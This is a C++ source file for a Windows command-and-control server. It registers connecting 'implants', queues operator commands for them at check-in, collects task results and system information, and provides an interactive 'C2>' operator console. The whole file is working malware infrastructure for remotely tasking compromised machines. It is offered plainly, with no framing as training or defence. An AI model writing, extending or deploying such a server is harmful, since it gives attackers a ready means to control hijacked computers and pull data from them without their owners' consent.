// c2_server.cpp
#include "server.h"

using namespace std;

// BasicC2Server implementation
BasicC2Server::BasicC2Server(int port) : port(port), running(false) {
    initialize_winsock();
}

BasicC2Server::~BasicC2Server() {
    stop();
}

void BasicC2Server::initialize_winsock() {
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        throw runtime_error("WSAStartup failed: " + to_string(WSAGetLastError()));
    }
}

void BasicC2Server::create_server_socket() {
    server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_socket == INVALID_SOCKET) {
        throw runtime_error("Socket creation failed: " + to_string(WSAGetLastError()));
    }
}

void BasicC2Server::bind_server_socket() {
    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);
    
    if (bind(server_socket, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        throw runtime_error("Bind failed: " + to_string(WSAGetLastError()));
    }
}

void BasicC2Server::start_listening() {
    if (listen(server_socket, 5) == SOCKET_ERROR) {
        throw runtime_error("Listen failed: " + to_string(WSAGetLastError()));
    }
}

string BasicC2Server::get_client_ip(sockaddr_in client_addr) {
    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(client_addr.sin_addr), client_ip, INET_ADDRSTRLEN);
    return string(client_ip);
}

vector<string> BasicC2Server::split_string(const string& str, char delimiter) {
    vector<string> tokens;
    string token;
    istringstream token_stream(str);
    
    while (getline(token_stream, token, delimiter)) {
        if (!token.empty()) {
            tokens.push_back(token);
        }
    }
    
    return tokens;
}

void BasicC2Server::log(const string& message) {
    auto now = chrono::system_clock::now();
    auto time_t = chrono::system_clock::to_time_t(now);
    
    cout << "[" << put_time(localtime(&time_t), "%Y-%m-%d %H:%M:%S") << "] " 
         << message << endl;
}

void BasicC2Server::log_error(const string& message) {
    log("ERROR: " + message + " (Code: " + to_string(WSAGetLastError()) + ")");
}

void BasicC2Server::cleanup_client(SOCKET client_socket) {
    if (client_socket != INVALID_SOCKET) {
        closesocket(client_socket);
    }
}

string BasicC2Server::process_command(const string& implant_id, const string& command, const string& data) {
    log("Processing command '" + command + "' from " + implant_id);
    
    if (command == C2Protocol::CMD_CHECKIN) {
        update_client_last_seen(implant_id);
        vector<string> queued_commands = get_queued_commands(implant_id);
        
        string response = "status:" + C2Protocol::STATUS_SUCCESS;
        response += "|message:Welcome to C2 Server";
        response += "|checkin:60";
        
        if (!queued_commands.empty()) {
            response += "|commands:";
            for (const auto& cmd : queued_commands) {
                response += cmd + ";";
            }
        }
        else {
            response += "|commands:none";
        }
        
        return response;
    }
    else if (command == C2Protocol::CMD_TASK_RESULT) {
        store_task_result("task_" + to_string(time(nullptr)), data);
        return "status:" + C2Protocol::STATUS_SUCCESS + "|message:Result stored";
    }
    else if (command == "sysinfo_result") {
        log("System info from " + implant_id + ": " + data);
        return "status:" + C2Protocol::STATUS_SUCCESS + "|message:Info received";
    }
    
    return "status:" + C2Protocol::STATUS_ERROR + "|message:Unknown command";
}

void BasicC2Server::handle_client(SOCKET client_socket, sockaddr_in client_addr) {
    string client_ip = get_client_ip(client_addr);
    log("New connection from " + client_ip);
    
    char buffer[1024];
    int bytes_received;
    
    while ((bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytes_received] = '\0';
        string message(buffer);
        
        log("Received from " + client_ip + ": " + message.substr(0, 100) + "...");
        
        vector<string> parts = split_string(message, '|');
        if (parts.size() >= 2) {
            string implant_id = parts[0];
            string command = parts[1];
            string data = parts.size() > 2 ? parts[2] : "";
            
            // Add client on first contact
            if (connected_clients.find(implant_id) == connected_clients.end()) {
                add_client(implant_id, client_addr, client_socket);
            }
            
            string response = process_command(implant_id, command, data);
            send(client_socket, response.c_str(), response.length(), 0);
        }
        else {
            string error = "status:error|message:Invalid message format";
            send(client_socket, error.c_str(), error.length(), 0);
        }
    }
    
    cleanup_client(client_socket);
    log("Client disconnected: " + client_ip);
}

void BasicC2Server::start() {
    create_server_socket();
    bind_server_socket();
    start_listening();
    
    running = true;
    log("C2 Server started on port " + to_string(port));
    
    while (running) {
        sockaddr_in client_addr;
        int client_addr_size = sizeof(client_addr);
        
        SOCKET client_socket = accept(server_socket, (sockaddr*)&client_addr, &client_addr_size);
        if (client_socket == INVALID_SOCKET) {
            if (running) {
                log_error("Accept failed");
            }
            continue;
        }
        
        thread client_thread(&BasicC2Server::handle_client, this, client_socket, client_addr);
        client_thread.detach();
    }
    
    cleanup_client(server_socket);
}

void BasicC2Server::stop() {
    running = false;
    cleanup_client(server_socket);
}

// Command management
void BasicC2Server::queue_command(const string& implant_id, const string& command) {
    command_queue[implant_id].push_back(command);
    log("Command queued for " + implant_id + ": " + command);
}

vector<string> BasicC2Server::get_queued_commands(const string& implant_id) {
    if (command_queue.find(implant_id) != command_queue.end() && 
        !command_queue[implant_id].empty()) {
        vector<string> commands = command_queue[implant_id];
        command_queue[implant_id].clear();
        return commands;
    }
    return vector<string>();
}

void BasicC2Server::clear_command_queue(const string& implant_id) {
    command_queue[implant_id].clear();
}

// Client management
void BasicC2Server::add_client(const string& implant_id, sockaddr_in address, SOCKET socket) {
    ClientInfo client_info;
    client_info.address = address;
    client_info.socket = socket;
    client_info.implant_id = implant_id;
    client_info.last_seen = time(nullptr);
    
    connected_clients[implant_id] = client_info;
    log("New implant registered: " + implant_id);
}

void BasicC2Server::remove_client(const string& implant_id) {
    connected_clients.erase(implant_id);
    log("Implant removed: " + implant_id);
}

vector<string> BasicC2Server::get_connected_clients() {
    vector<string> clients;
    for (const auto& pair : connected_clients) {
        clients.push_back(pair.first);
    }
    return clients;
}

void BasicC2Server::update_client_last_seen(const string& implant_id) {
    if (connected_clients.find(implant_id) != connected_clients.end()) {
        connected_clients[implant_id].last_seen = time(nullptr);
    }
}

// Task management
void BasicC2Server::store_task_result(const string& task_id, const string& result) {
    task_results[task_id] = result;
    log("Task result stored: " + task_id);
}

string BasicC2Server::get_task_result(const string& task_id) {
    return task_results[task_id];
}

// C2Controller implementation
namespace C2Controller {
    void print_banner() {
        cout << "=== Basic C2 Server Controller ===" << endl;
        cout << "Type 'help' for available commands" << endl;
    }
    
    void print_help() {
        cout << "Available commands:" << endl;
        cout << "  list - Show connected implants" << endl;
        cout << "  queue <implant_id> <command> - Queue command" << endl;
        cout << "  results - Show task results" << endl;
        cout << "  clear <implant_id> - Clear command queue" << endl;
        cout << "  exit - Stop server" << endl;
    }
    
    void handle_list_command(BasicC2Server* server) {
        vector<string> clients = server->get_connected_clients();
        cout << "Connected implants (" << clients.size() << "):" << endl;
        for (const auto& client : clients) {
            cout << "  " << client << endl;
        }
    }
    
    void handle_queue_command(BasicC2Server* server, const string& input) {
        size_t first_space = input.find(' ', 6); // After "queue "
        size_t second_space = input.find(' ', first_space + 1);
        
        if (first_space != string::npos && second_space != string::npos) {
            string implant_id = input.substr(6, first_space - 6);
            string command = input.substr(first_space + 1);
            server->queue_command(implant_id, command);
            cout << "Command queued for " << implant_id << endl;
        }
        else {
            cout << "Usage: queue <implant_id> <command>" << endl;
        }
    }
    
    void handle_results_command(BasicC2Server* server) {
        cout << "Task results functionality not fully implemented in this example" << endl;
    }
    
    void start_interactive_controller(BasicC2Server* server) {
        print_banner();
        
        while (true) {
            cout << "C2> ";
            string input;
            getline(cin, input);
            
            if (input == "help") {
                print_help();
            }
            else if (input == "list") {
                handle_list_command(server);
            }
            else if (input.find("queue ") == 0) {
                handle_queue_command(server, input);
            }
            else if (input == "results") {
                handle_results_command(server);
            }
            else if (input.find("clear ") == 0) {
                string implant_id = input.substr(6);
                server->clear_command_queue(implant_id);
                cout << "Command queue cleared for " << implant_id << endl;
            }
            else if (input == "exit") {
                break;
            }
            else if (!input.empty()) {
                cout << "Unknown command. Type 'help' for help." << endl;
            }
        }
    }
}